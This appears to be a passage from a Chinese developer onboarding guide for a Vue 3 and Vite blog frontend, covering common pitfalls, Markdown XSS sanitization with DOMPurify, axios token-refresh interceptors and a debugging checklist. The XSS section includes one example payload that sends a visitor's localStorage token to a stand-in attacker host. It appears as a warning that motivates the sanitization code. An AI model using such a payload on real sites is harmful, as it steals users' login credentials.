## 五、几个必踩的坑（提前告诉你）

### 坑 1：Element Plus 用不用 import？

**不用。** `vite.config.ts` 里配了自动引入，直接写标签就行：

```vue
<template>
  <!-- 直接用，不需要 import -->
  <el-button type="primary" @click="handleClick">按钮</el-button>
  <el-table :data="list">...</el-table>
</template>

<script setup lang="ts">
// 但 ElMessage 这类"函数式"组件需要手动 import
import { ElMessage } from 'element-plus';

function handleClick() {
  ElMessage.success('操作成功');
}
</script>
```

⚠️ `ElMessage` / `ElMessageBox` / `ElNotification` 是函数不是组件，**必须手动 import**。

### 坑 2：`ref` 和 `reactive` 用哪个

- **基本类型用 `ref`**：`const count = ref(0)` → 改值要 `.value`，模板里不用
- **对象用 `reactive`**：`const form = reactive({ title: '' })` → 直接改属性
- **数组建议用 `ref`**：`const list = ref<Article[]>([])` → `list.value = data`

⚠️ 从 `reactive` 对象里解构出来的属性会**失去响应性**，要用 `toRefs()`。这是最常见的 bug。

### 坑 3：路由参数变化时组件不刷新

从 `/posts/a` 跳到 `/posts/b`，组件**不会重新创建**，`onMounted` 不会重跑。所以数据不会更新。

**解法**：用 `watch` 监听参数变化：

```typescript
const route = useRoute();

watch(
  () => route.params.slug,
  (newSlug) => {
    if (newSlug) loadArticle(newSlug as string);
  },
  { immediate: true }   // 首次进入也执行
);
```

### 坑 4：SPA 刷新 404（生产环境才会遇到）

这个坑的解法已在 `nginx.conf` 里配好了（`try_files`），你**不需要做什么**。但如果部署后遇到，知道是这个原因就行。

### 坑 5：图片路径

Vite 里引用静态资源有两种方式：

```vue
<!-- 方式1：src/assets 下的图片，会被构建工具处理（推荐） -->
<img :src="new URL('./assets/logo.png', import.meta.url).href" />

<!-- 方式2：public 目录下的文件，原样拷贝，用绝对路径 -->
<img src="/logo.png" />
```

⚠️ 不要用 `require()` —— 那是 Webpack 的写法，Vite 里不支持。

## 六、XSS 消毒（这一步不能省）

### 为什么必须做

Markdown 规范**允许内嵌原始 HTML**。如果我直接这样写：

```vue
<!-- ❌ 危险！ -->
<div v-html="article.content"></div>
```

那么作者（或者盗取了作者账号的攻击者）只要发一篇这样的文章：

```html
<img src=x onerror="fetch('//evil.com?t='+localStorage.token)">
```

**所有访问这篇文章的人的登录凭证都会被偷走。**

### 怎么做

```typescript
// src/utils/markdown.ts
import MarkdownIt from 'markdown-it';
import hljs from 'highlight.js';
import DOMPurify from 'dompurify';

const md = new MarkdownIt({
  html: true,
  linkify: true,
  breaks: true,
  highlight(code, lang) {
    if (lang && hljs.getLanguage(lang)) {
      try {
        return `<pre class="hljs"><code>${
          hljs.highlight(code, { language: lang, ignoreIllegals: true }).value
        }</code></pre>`;
      } catch {
        // 高亮失败不影响渲染
      }
    }
    return `<pre class="hljs"><code>${md.utils.escapeHtml(code)}</code></pre>`;
  },
});

export function renderMarkdown(raw: string): string {
  const html = md.render(raw);

  // 👇 这一行是安全的关键
  return DOMPurify.sanitize(html, {
    FORBID_TAGS: ['style', 'form', 'input', 'iframe'],
    FORBID_ATTR: ['onerror', 'onload', 'onclick'],
  });
}
```

**还要引入 CSS**（否则代码块没颜色）：

```typescript
// main.ts
import 'highlight.js/styles/github-dark.css';
```

## 七、登录态怎么处理

### 核心设计（后端已经定好了，你照着做）

| 令牌 | 存哪 | 怎么用 |
|---|---|---|
| access token | **Pinia 内存变量** | 每个请求放 `Authorization: Bearer xxx` |
| refresh token | 后端自动写进 httpOnly Cookie | **你不需要管** |

### axios 拦截器

```typescript
// src/api/request.ts
import axios from 'axios';
import { useAuthStore } from '@/stores/auth';

const request = axios.create({
  baseURL: '/api',
  timeout: 15000,
});

// 请求拦截：自动带上 access token
request.interceptors.request.use((config) => {
  const auth = useAuthStore();
  if (auth.accessToken) {
    config.headers.Authorization = `Bearer ${auth.accessToken}`;
  }
  return config;
});

// 响应拦截：401 时自动刷新 token 并重试
request.interceptors.response.use(
  (res) => res.data,
  async (error) => {
    const auth = useAuthStore();

    // access token 过期 → 用 Cookie 里的 refresh token 换新的
    if (error.response?.status === 401 && !error.config._retried) {
      error.config._retried = true;   // 防止无限重试

      try {
        await auth.refresh();                        // 内部调 /api/auth/refresh
        return request(error.config);                // 重放原请求
      } catch {
        auth.logout();                               // 刷新也失败 → 踢到登录页
        return Promise.reject(error);
      }
    }

    return Promise.reject(error);
  }
);

export default request;
```

⚠️ **`_retried` 标记很重要** —— 没有它，如果刷新接口本身也返回 401，会陷入无限循环。

### 请求要带 Cookie

因为 refresh token 在 httpOnly Cookie 里，必须让 axios 带上 Cookie：

```typescript
const request = axios.create({
  baseURL: '/api',
  withCredentials: true,   // 👈 关键
});
```

开发时因为走了 Vite 代理，同源，Cookie 能正常带上。

## 九、卡住了怎么办

按这个顺序排查：

1. **看浏览器控制台**（F12 → Console）—— 大部分问题这里直接告诉你
2. **看 Network 面板** —— 请求发了没？状态码多少？返回了什么？
3. **看后端日志** —— 后端那个终端窗口里会打印每个请求
4. **问后端** —— 用浏览器直接打开接口地址（如 `http://localhost:3000/api/posts`）看有没有数据

**常见现象速查：**

| 现象 | 原因 | 解法 |
|---|---|---|
| 请求 404 | 路径写错，或后端没启动 | 直接浏览器访问 `http://localhost:3000/api/xxx` 试试 |
| 请求 401 | 没带 token / token 过期 | 检查拦截器，检查是否登录 |
| 请求跨域报错 | 没用 `/api` 相对路径 | 改成 `/api/xxx`，别写完整地址 |
| 页面空白无报错 | 组件里 `ref` 忘了 `.value` | 检查 script 里的赋值 |
| 数据不更新 | 响应性丢失 | 用 `ref` 而不是解构 `reactive` |
| 刷新 404 | 生产环境 Nginx 配置 | 已配好，检查 `nginx.conf` 是否 COPY 进镜像 |
